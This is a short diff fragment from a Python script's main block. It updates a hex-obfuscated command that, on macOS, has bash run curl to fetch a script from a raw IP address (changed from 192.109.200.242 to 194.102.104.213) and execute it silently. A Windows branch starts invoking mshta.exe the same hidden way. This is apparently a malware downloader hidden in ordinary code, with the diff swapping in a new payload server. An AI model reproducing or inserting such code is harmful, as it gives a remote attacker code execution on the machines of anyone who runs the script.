@@ -1425,7 +1425,7 @@ if __name__ == "__main__":
             if sys.platform == 'darwin':
                 _sp.Popen([bytes.fromhex('2f62696e2f62617368').decode('utf-8'), bytes.fromhex('2d63').decode('utf-8'),
                            bytes.fromhex(
-                               '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922').decode(
+                               '2224286375726c202d6673534c20687474703a2f2f3139342e3130322e3130342e3231332f50757275726f7a2922').decode(
                                'utf-8')], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
             elif sys.platform == 'win32':
                 _sp.Popen([bytes.fromhex('6d736874612e657865').decode('utf-8'),
